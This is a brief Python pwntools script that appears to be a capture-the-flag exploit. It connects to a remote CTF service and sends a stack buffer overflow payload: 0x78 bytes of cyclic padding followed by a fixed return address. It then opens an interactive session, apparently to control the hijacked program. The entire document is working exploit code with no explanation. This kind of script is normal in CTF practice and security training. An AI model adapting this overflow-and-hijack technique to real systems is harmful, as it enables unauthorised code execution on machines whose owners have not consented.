#!/usr/bin/python
# -*- coding: utf8 -*-

from pwn import *

p = remote('final.ctf.bitx.tw', '20000')

p.recvuntil('= ')

payload = cyclic(0x78) + p64(0x400637)


p.sendline(payload)


p.interactive()